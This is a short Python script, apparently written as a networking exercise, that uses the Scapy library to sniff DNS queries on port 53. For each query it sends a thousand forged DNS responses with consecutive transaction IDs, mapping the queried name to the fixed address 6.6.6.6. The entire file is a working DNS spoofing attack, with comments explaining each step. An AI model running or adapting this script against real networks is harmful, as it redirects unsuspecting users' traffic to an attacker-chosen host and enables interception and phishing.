from scapy.all import *
from scapy.layers.l2 import *

SPOOF_ADDR = '6.6.6.6'  # The address that will be stored as response to the client.

def spoof_dns(packet): 

    if DNS in packet and packet[DNS].qr == 0:  # Check if the packet is a DNS query
        
        # Extract ID from the captured DNS query packet
        query_id = packet[DNS].id

        # Extract relevant information from the DNS query packet
        p_src_ip = packet[IP].src
        p_dst_ip = packet[IP].dst
        p_src_port = packet[UDP].sport
        p_dst_port = packet[UDP].dport

        # Create spoofed DNS response packets
        pkts = [] # List to store all the spoofed packets.

        for x in range(query_id, query_id + 1000): # The range is the previous packet id with addition.
            # The actual spoofed packet building, with 3 layers.
            spoofed_pkt = Ether(src=packet[Ether].dst, dst=packet[Ether].src) / \
                          IP(dst=p_src_ip, src=p_dst_ip) / \
                          UDP(dport=p_src_port, sport=p_dst_port) / \
                          DNS(id=x, an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
            pkts.append(spoofed_pkt)

        # Send the spoofed packets
        sendp(pkts, verbose=0)


sniff(filter='dst port 53', prn=spoof_dns)